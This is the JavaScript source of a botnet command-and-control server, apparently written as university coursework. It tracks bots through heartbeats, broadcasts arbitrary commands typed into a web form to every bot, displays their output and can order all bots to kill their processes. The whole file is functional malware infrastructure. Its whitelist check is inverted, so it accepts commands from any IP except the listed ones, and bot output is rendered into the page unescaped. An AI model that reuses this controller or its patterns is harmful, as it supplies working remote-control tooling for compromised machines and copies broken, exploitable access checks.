/*
Description: This is the 'host'(Command and control) side of the 'botnet', designed to send out commands and such.
Disclaimer: This is NOT a real C&C server nor is it used as such, nor would it be very good at handling a botnet in the real world.
			This is simply an example built for university coursework.
*/

var express = require('express');
var app = express();
var bodyParser = require("body-parser");
//To deal with POSTs because we're not a big fan of GETs
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

//Some global vars
var bots = [];
var whitelist = [ //List of IP's that can send commands to the botnet
"::ffff:127.0.0.1",
"::ff"
];

//*****Express routing*****
app.get('/', function (req, res) {
  res.writeHead(200,{"Content-Type" : "text/html"}); //Forcing HTML instead of text
  res.write('<h1>C&C Server Online</h1>\n');
  res.write(genTable());
  res.end();
});

//This might not actually be a new bot, it could have just restarted, so let's handle that
function handleNew(newBot) {
	var found = false;
	for (var i = 0; i < bots.length; i++) {
		if (bots[i].ip == newBot.ip) {
			found = true;
		}
	}
	if (!found) {
		bots.push(newBot);
	}
}

//Our bots will intermittently send heartbeats so we know they're online still, and update their status
app.post('/heartbeat', function(req, res) {
	//Look through known bots and update their status based on IP
	var foundInBots = false;
	var actualBot; //This will be the bot that just heartbeated
	//[section] Updates bots we already know about with their current status
	for (var i = 0; i < bots.length; i++) {
		if (bots[i].ip == req.ip) {
			actualBot = bots[i];
			console.warn("Received heartbeat from  " + req.ip);
			bots[i].status = req.body.status;
			bots[i].stdout = req.body.lastOut;
			if (!bots[i].online) {
				console.warn(bots[i].ip + " is no longer stale, set as online")
				bots[i].online = true;
			}
			foundInBots = true;
			bots[i].lastHeartbeat = Date().toLocaleString();
		}
	}
	//[/section]
	//[section] If we don't know about that bot, we add it to our list
	if (!foundInBots) {
		var bot = {
			ip: req.ip, //This is based off of what WE see when the bot contacts us
			online: true, //We can assume this
			status: req.body.status, //This is part of the post that they send us
			lastHeartbeat: Date().toLocaleString(),
			outstandingWork: false,
			command: "",
			stdout: ""
		};
		handleNew(bot);
		res.send("added"); 
		console.log("New bot added from " + req.ip);
	//[/section]
	//This section handles the reply to any bots that we know about, and just checked in with a heartbeat
	} else {
		//Let's tell the bot if they have work available
		if (actualBot.outstandingWork) {
			res.send("workavailable");
			//Since the bot has been told it has work available, we can then remove that so it doesn't get redirected on its next heartbeat
			actualBot.outstandingWork = false;
		} else {
		//Or not
			res.send("pong");
		}
		
	}
});

//We POST here to send new commands to the botnet
app.post('/command', function(req, res) {
	//Let's make sure nobody else can post here except us
	if (whitelist.includes(req.ip)) {
		res.status(403).send('Forbidden');
		console.log("Denied command call from " + req.ip);
	} else {
		console.log("New command received: " + req.body.command);
		console.log("Broadcasting to bots");
		for (var i = 0; i < bots.length; i++) {
			bots[i].outstandingWork = true;
			bots[i].command = req.body.command;
		}
		res.send("Command broadcast");
	}
});
//We GET here to grab the latest work for our IP
app.get('/command', function(req, res) {
	for (var i = 0; i < bots.length; i++) {
		if (req.ip == bots[i].ip) {
			res.send(bots[i].command);
		}
	}
});

//Allow us to kill all current child processes on our bots as a loop safety measure
app.post('/kill', function(req, res) {
	console.log("Setting all processes to kill");
	for (var i = 0; i < bots.length; i++) {
			bots[i].outstandingWork = true;
			bots[i].command = "kill";
	}
	res.send("Killed all bots child processes");
});

//Check every 10s to make sure our bots are up to date
setInterval(function() {
	for (var i = 0; i < bots.length; i++) {
		var calc = (Date.now() - Date.parse(bots[i].lastHeartbeat)) / 1000; //Time in seconds since last heartbeat
		if (calc > 15 && bots[i].online == true) {
			bots[i].online = false;
			console.warn(bots[i].ip + " has gone stale, set as offline");
		} else if (calc < 15) {
			bots[i].online = true;
		}
	}
}, 10000);




//Start the server
app.listen(3000, function () {
  	console.log('C&C Server Online, waiting for bots');
});

//Templates and table gens
function genTable() {
	var tableHTML = headerTable;
	for (var i = 0; i < bots.length; i++) {
		tableHTML += tableContentGen(bots[i].ip, bots[i].online, bots[i].status, bots[i].lastHeartbeat, bots[i].outstandingWork, bots[i].command, bots[i].stdout);
	}
	tableHTML += footerTable;
	return tableHTML;
}

var headerTable = `
<table border="1">
  <tr>
    <th>IP</th>
    <th>Online</th>
    <th>Last Status</th>
    <th>Last Heartbeat</th>
    <th>Work Available</th>
    <th>Last Command</th>
    <th>Last Output</th>
  </tr>
`;

function tableContentGen(ip, online, status, lhb, work, cmd, stdout) {
	return ` 
	<tr>
    <td>${ip}</td>
    <td>${online}</td>
    <td>${status}</td>
    <td>${lhb}</td>
    <td>${work}</td>
    <td>${cmd}</td>
    <td>${stdout}</td>
  </tr>`
}

var footerTable = `</table><br><br>
<form action="command" method="post">
  Command: <input type="text" name="command" length=100><br>
  <input type="submit" value="Submit">
</form><br><br>
	<form action="kill" method="post">
	<input type="submit" value="Kill all processes">
</form>`;